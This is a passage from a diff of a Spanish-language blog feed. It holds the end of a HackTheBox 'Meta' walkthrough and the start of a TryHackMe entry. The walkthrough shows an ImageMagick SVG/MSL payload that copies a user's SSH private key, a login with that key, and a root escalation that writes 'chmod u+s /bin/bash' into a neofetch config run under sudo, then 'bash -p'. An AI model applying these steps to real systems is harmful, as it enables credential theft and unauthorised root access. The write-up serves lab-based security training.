+  &amp;lt;svg &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;700&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;700&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/2000/svg&quot;&lt;/span&gt; xmlns:xlink&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/1999/xlink&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+  &amp;lt;image xlink:href&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;msl:poc.svg&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;100&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;100&quot;&lt;/span&gt;/&amp;gt;
+  &amp;lt;/svg&amp;gt;
+&amp;lt;/image&amp;gt;
+
+www-data@meta:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc.svg /var/www/dev01.artcorp.htb/convert_images/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finalmente, luego del proceso anterior tenemos premisos de lectura para poder copiar la llave id_rsa de Thomas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@meta:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 8
+drwxrwxrwt  2 root     root       80 Jun 20 14:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 16 root     root     3080 Jun 19 19:18 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 thomas   thomas   2590 Jun 20 14:10 id_rsa
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data  426 Jun 20 14:07 poc.svg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Estamos listos para ingresar con un nuevo usuario por SSH, para esto vamos a crear un fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; y se le asignan los permisos 600, requeridos para poder iniciar sesión con la llave obtenida.&lt;/p&gt;
+
+&lt;h2 id=&quot;intrución&quot;&gt;INTRUCIÓN&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ vim id_rsa
+❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
+❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa thomas@10.10.11.140
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.11.140 (10.10.11.140)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:KjNiuFNo5CvSMSQO5ETmw1YJPtafmymn6SkBbMLIAFg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '&lt;/span&gt;10.10.11.140&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+thomas@meta:~$ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;¡Hemos tenido acceso con el usuario Thomas!
+Ahora vamos a proceder con la lectura de nuestra primera flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;thomas@meta:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;74f2b57ad0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Genial! Solo nos queda escalar privilegios para lograr obtener la flag de root, iniciamos con la enumeración de comandos y variables permitidas bajo el comando sudo.&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;thomas@meta:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;thomas on meta:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;XDG_CONFIG_HOME
+
+User thomas may run the following commands on meta:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/neofetch &lt;span class=&quot;se&quot;&gt;\&quot;\&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de investigar, encontramos que la variable XDG_CONFIG_HOME es potencial vector de escalamiento junto con el comando neofetch.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Entramos al a ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/neofetch&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Ingresamos al fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.conf&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Agregamos la siguiente línea dando permisos suid a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Asignamos la ruta modificada a la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XDG_CONFIG_HOME&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Ejecutamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neofetch&lt;/code&gt; como sudo&lt;/li&gt;
+  &lt;li&gt;Revisamos los permisos suid de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Ejecutamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; para tener acceso privilegiado a la maquina&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;thomas@meta:~/.config/neofetch&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano config.conf 
+
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+s /bin/bash
+
+thomas@meta:~/.config/neofetch&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XDG_CONFIG_HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/thomas/.config/
+
+thomas@meta:~/.config/neofetch&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;neofetch
+       _,met&lt;span class=&quot;nv&quot;&gt;$$$$$gg&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;          root@meta 
+    ,g&lt;span class=&quot;nv&quot;&gt;$$$$$$$$$$$$$$$P&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt; 
+  ,g&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;P&lt;span class=&quot;s2&quot;&gt;&quot;     &quot;&quot;&quot;&lt;/span&gt;Y&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;.&lt;span class=&quot;s2&quot;&gt;&quot;.        OS: Debian GNU/Linux 10 (buster) x86_64 
+ ,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;P'              &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$$.&lt;/span&gt;     Host: VMware Virtual Platform None 
+&lt;span class=&quot;s1&quot;&gt;',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
+`d$$'&lt;/span&gt;     ,&lt;span class=&quot;nv&quot;&gt;$P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;'   .    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   Uptime: 19 hours, 15 mins 
+ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;P      d&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;     ,    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;P    Packages: 495 (dpkg) 
+ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:      &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.   -    ,d&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'    Shell: bash 5.0.3 
+ &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;      Y&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;._   _,d&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$P&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz 
+ Y&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.    &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;.&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;Y&lt;span class=&quot;nv&quot;&gt;$$$$&lt;/span&gt;P&lt;span class=&quot;s2&quot;&gt;&quot;'         GPU: VMware SVGA II Adapter 
+ &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;b      &lt;span class=&quot;s2&quot;&gt;&quot;-.__              Memory: 167MiB / 1994MiB 
+  &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;Y&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;
+   &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Y&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.                                              
+     &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;b.
+       &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Y&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b.
+          &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;._
+              &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;
+
+thomas@meta:~/.config/neofetch&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ls -la /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+
+
+thomas@meta:~/.config/neofetch&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bash -p
+bash-5.0# whoami
+root
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Logramos tener acceso como root! No queda nada más, vamos a acceder a la carpeta que contiene la flag y eso es todo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-5.0# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+bash-5.0# &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;conf  root.txt
+bash-5.0# &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 root.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;4dea5795d3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Hemos logrado completar la maquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Meta&lt;/code&gt; de HackTheBox!&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/meta/06-finish.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Meta" /><summary type="html">Vamos a resolver la maquina Meta de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">THM Mr. Robot</title><link href="http://localhost:4000/mrrobot/" rel="alternate" type="text/html" title="THM Mr. Robot" /><published>2022-06-15T00:00:00-05:00</published><updated>2022-06-15T00:00:00-05:00</updated><id>http://localhost:4000/mrrobot</id><content type="html" xml:base="http://localhost:4000/mrrobot/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/mrrobot/00inicio.png&quot; /&gt;
 &lt;/p&gt;
 
